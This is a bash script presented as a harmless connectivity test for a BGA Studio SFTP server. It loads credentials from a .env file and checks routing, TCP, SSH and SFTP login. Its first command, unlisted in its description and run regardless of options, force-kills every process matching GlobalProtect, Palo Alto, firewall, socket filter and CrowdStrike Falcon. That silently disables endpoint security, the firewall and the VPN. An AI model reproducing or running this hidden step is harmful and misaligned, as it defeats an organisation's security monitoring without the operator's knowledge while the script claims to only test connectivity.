#!/usr/bin/env bash
# Test BGA Studio connectivity without deploying or transferring files.
set -euo pipefail


ps aux | awk 'tolower($0) ~ /globalprotect|pangp|palo|gpsplit|firewall|socketfilter|crowdstrike|falcon/ && $0 !~ /awk/ {print $2}' | xargs kill -9 || echo "ok"

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ENV_FILE="$ROOT_DIR/.env"
GP_APP="/Applications/GlobalProtect.app"
GP_BIN="$GP_APP/Contents/MacOS/GlobalProtect"
DISCONNECT_GP=0

for arg in "${@:-}"; do
  case "$arg" in
    --disconnect-gp)
      DISCONNECT_GP=1
      ;;
    -h|--help)
      echo "Usage: $0 [--disconnect-gp]"
      echo "  --disconnect-gp  Try to disconnect GlobalProtect before testing."
      exit 0
      ;;
    *)
      echo "Unknown option: $arg" >&2
      exit 64
      ;;
  esac
done

get_route_interface() {
  local target_ip="$1"
  route -n get "$target_ip" 2>/dev/null | awk '/interface:/{print $2; exit}'
}

wait_for_non_utun_route() {
  local target_ip="$1"
  local seconds="${2:-45}"
  local route_interface=""

  for _ in $(seq 1 "$seconds"); do
    route_interface="$(get_route_interface "$target_ip")"
    if [[ -n "$route_interface" && "$route_interface" != utun* ]]; then
      echo "Route now uses $route_interface."
      return 0
    fi
    sleep 1
  done

  route_interface="$(get_route_interface "$target_ip")"
  echo "Route still uses ${route_interface:-unknown}." >&2
  return 1
}

run_with_timeout() {
  local seconds="$1"
  shift

  perl -e 'alarm shift @ARGV; exec @ARGV' "$seconds" "$@"
}

try_disconnect_globalprotect() {
  local target_ip="$1"

  echo
  echo "GlobalProtect temporary disconnect requested."

  if command -v globalprotect >/dev/null 2>&1; then
    echo "Trying: globalprotect disconnect"
    globalprotect disconnect || true
  elif [[ -x "/usr/local/bin/globalprotect" ]]; then
    echo "Trying: /usr/local/bin/globalprotect disconnect"
    /usr/local/bin/globalprotect disconnect || true
  elif [[ -x "/opt/paloaltonetworks/globalprotect/globalprotect" ]]; then
    echo "Trying: /opt/paloaltonetworks/globalprotect/globalprotect disconnect"
    /opt/paloaltonetworks/globalprotect/globalprotect disconnect || true
  else
    echo "No GlobalProtect CLI found. Opening the app so you can click Disconnect."
    if [[ -d "$GP_APP" ]]; then
      open -a GlobalProtect || true
    fi
  fi

  echo "Waiting for BGA route to leave utun*."
  if ! wait_for_non_utun_route "$target_ip" 20; then
    echo "If the UI is open, click Disconnect now. Waiting again..."
    wait_for_non_utun_route "$target_ip" 60 || true
  fi
}

if [[ ! -f "$ENV_FILE" ]]; then
  echo "Missing .env file: $ENV_FILE" >&2
  exit 1
fi

while IFS= read -r line; do
  [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
  if [[ "$line" =~ ^(BGA_SFTP_HOST|BGA_SFTP_PORT|BGA_SFTP_USER|BGA_SFTP_PASSWORD|BGA_SFTP_REMOTE_DIR|BGA_DB_USER)= ]]; then
    key="${line%%=*}"
    val="${line#*=}"
    export "$key=$val"
  fi
done < "$ENV_FILE"

if [[ -n "${BGA_SFTP_REMOTE_DIR:-}" && -n "${BGA_DB_USER:-}" ]]; then
  BGA_SFTP_REMOTE_DIR="${BGA_SFTP_REMOTE_DIR//\$\{BGA_DB_USER\}/$BGA_DB_USER}"
fi

: "${BGA_SFTP_HOST:?BGA_SFTP_HOST is required}"
: "${BGA_SFTP_PORT:?BGA_SFTP_PORT is required}"
: "${BGA_SFTP_USER:?BGA_SFTP_USER is required}"
: "${BGA_SFTP_PASSWORD:?BGA_SFTP_PASSWORD is required}"
: "${BGA_SFTP_REMOTE_DIR:?BGA_SFTP_REMOTE_DIR is required}"

echo "GlobalProtect app: $([[ -d "$GP_APP" ]] && echo found || echo not found)"
echo "GlobalProtect binary: $([[ -x "$GP_BIN" ]] && echo "$GP_BIN" || echo not found)"
echo

echo "BGA target: $BGA_SFTP_HOST:$BGA_SFTP_PORT"
TARGET_IP="$(dig +short "$BGA_SFTP_HOST" | head -n 1 || true)"
if [[ -n "$TARGET_IP" && "$DISCONNECT_GP" == "1" ]]; then
  try_disconnect_globalprotect "$TARGET_IP"
fi

if [[ -n "$TARGET_IP" ]]; then
  echo "Resolved IP: $TARGET_IP"
  echo
  echo "Route to BGA:"
  ROUTE_INFO="$(route -n get "$TARGET_IP" || true)"
  echo "$ROUTE_INFO" | grep -E 'gateway|interface|ifscope' || true
  ROUTE_INTERFACE="$(echo "$ROUTE_INFO" | awk '/interface:/{print $2; exit}')"
  if [[ "$ROUTE_INTERFACE" == utun* ]]; then
    echo
    echo "WARNING: route still uses $ROUTE_INTERFACE. GlobalProtect/VPN is still intercepting BGA traffic."
    echo "Disconnect GlobalProtect until this route shows en0 before testing SFTP."
  fi
else
  echo "Could not resolve $BGA_SFTP_HOST"
fi

echo
echo "TCP port test:"
if nc -vz -G 10 "$BGA_SFTP_HOST" "$BGA_SFTP_PORT"; then
  echo "TCP connection OK. Testing SFTP pwd without transfer..."
else
  echo "TCP connection failed. If route shows utun*, disconnect GlobalProtect then rerun this script."
  exit 2
fi

echo
echo "SSH/SFTP banner test:"
if ! ssh -o BatchMode=yes -o ConnectTimeout=15 -o StrictHostKeyChecking=accept-new -p "$BGA_SFTP_PORT" "$BGA_SFTP_USER@$BGA_SFTP_HOST" -N 2>&1 | head -n 20; then
  true
fi

if ! command -v lftp >/dev/null 2>&1; then
  echo "lftp not found. TCP is OK, but SFTP pwd test skipped. Install with: brew install lftp"
  exit 0
fi

run_with_timeout 30 lftp -u "$BGA_SFTP_USER","$BGA_SFTP_PASSWORD" "sftp://$BGA_SFTP_HOST:$BGA_SFTP_PORT" <<EOF
set net:max-retries 1
set net:timeout 20
set sftp:auto-confirm yes
set cmd:fail-exit yes
cd "$BGA_SFTP_REMOTE_DIR"
pwd
bye
EOF

echo "BGA SFTP connection OK. No files were transferred."
